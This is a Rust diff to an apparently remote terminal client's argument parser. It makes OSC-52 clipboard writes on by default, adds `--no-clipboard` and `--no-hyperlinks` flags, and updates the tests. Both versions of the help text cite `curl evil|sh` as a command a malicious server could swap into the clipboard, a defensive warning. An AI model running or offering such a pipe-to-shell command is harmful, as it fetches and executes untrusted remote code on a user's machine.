@@ -195,8 +195,12 @@ fn connect() -> Command {
                 .help("Dial the server via a self-hosted relay URL instead of n0's public relays"),
         )
         .arg(
-            flag("clipboard", "clipboard")
-                .help("Honor remote OSC-52 clipboard writes (let the remote app set your system clipboard). OFF by default: a malicious/compromised server could otherwise silently overwrite your clipboard (e.g. swap a copied command for `curl evil|sh`). A deliberate per-session opt-in"),
+            flag("no_clipboard", "no-clipboard")
+                .help("Ignore the remote app's OSC-52 clipboard writes. By default they set your system clipboard (base64 only, at most 16 KiB, never read back), so a remote app's \"copy\" works; but a malicious or compromised server can then replace what you copied (a command for `curl evil|sh`, say). Use this when you do not trust the server"),
+        )
+        .arg(
+            flag("no_hyperlinks", "no-hyperlinks")
+                .help("Paint the remote app's hyperlinks (OSC 8) as plain text. By default they are painted as links your terminal can open, each checked first: printable ASCII only, within fux-vt's limits"),
         )
         .arg(
             Arg::new("on_bell")
@@ -262,7 +266,8 @@ pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
             key_file: m.get_one::<PathBuf>("key_file").cloned(),
             direct: m.get_one::<SocketAddr>("direct").copied(),
             relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
-            clipboard: m.get_flag("clipboard"),
+            clipboard: !m.get_flag("no_clipboard"),
+            hyperlinks: !m.get_flag("no_hyperlinks"),
             bell_command: m.get_one::<String>("on_bell").cloned(),
         })),
         Some(("id", m)) => Ok(Cmd::Key(KeyConfig {
@@ -385,7 +390,36 @@ mod tests {
         };
         assert_eq!(c.server, ID.parse().unwrap());
         assert_eq!(c.bell_command.as_deref(), Some("termux-notification"));
-        assert!(!c.clipboard && c.direct.is_none());
+        assert!(
+            c.clipboard && c.direct.is_none(),
+            "clipboard writes on by default"
+        );
+        assert!(koh::client::ConnectConfig::new(c.server).clipboard);
+    }
+
+    #[test]
+    fn no_clipboard_turns_clipboard_writes_off() {
+        let Cmd::Connect(c) = parsed(&["koh", "connect", ID, "--no-clipboard"]) else {
+            panic!("connect");
+        };
+        assert!(!c.clipboard);
+        // The old opt-in is gone, so a script that passed it hears of it.
+        assert!(command()
+            .try_get_matches_from(["koh", "connect", ID, "--clipboard"])
+            .is_err());
+    }
+
+    #[test]
+    fn hyperlinks_are_on_by_default_and_off_with_no_hyperlinks() {
+        let Cmd::Connect(c) = parsed(&["koh", "connect", ID]) else {
+            panic!("connect");
+        };
+        assert!(c.hyperlinks);
+        assert!(koh::client::ConnectConfig::new(c.server).hyperlinks);
+        let Cmd::Connect(c) = parsed(&["koh", "connect", ID, "--no-hyperlinks"]) else {
+            panic!("connect");
+        };
+        assert!(!c.hyperlinks && c.clipboard);
     }
 
     #[test]
